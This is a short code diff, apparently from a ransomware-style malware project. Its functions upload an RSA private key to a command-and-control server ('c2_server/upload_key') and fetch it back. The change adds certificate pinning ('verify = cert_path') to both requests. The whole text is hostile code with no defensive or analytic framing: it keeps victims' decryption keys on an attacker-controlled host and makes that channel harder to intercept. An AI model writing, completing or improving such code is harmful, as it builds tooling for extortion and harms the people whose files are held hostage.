@@ -7,7 +7,7 @@ import uuid
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
 from Session.Token_Handling import token_check
-from Core.Variables import c2_server, rsa_key
+from Core.Variables import c2_server, rsa_key, cert_path
 
 ####################################################################################################################
 
@@ -24,7 +24,7 @@ def send_private_key_to_c2(private_key):
     try:
         # Sending the private key to c2 server
         files = {"key": (renamed_key, private_key_bytes)}
-        response = requests.post(c2_server + "/upload_key", files=files, headers=headers)
+        response = requests.post(c2_server + "/upload_key", files=files, headers=headers, verify = cert_path)
         
         if response.status_code == 200:
             data = response.json()
@@ -66,7 +66,7 @@ def fetch_and_load_private_key():
 
     url = f"{c2_server}/get_key/{renamed_key}"
     try:
-        resp = requests.get(url, headers=headers)
+        resp = requests.get(url, headers=headers, verify = cert_path)
         resp.raise_for_status()
         print("Success fetching key") # Debug Message
     except requests.RequestException as e:
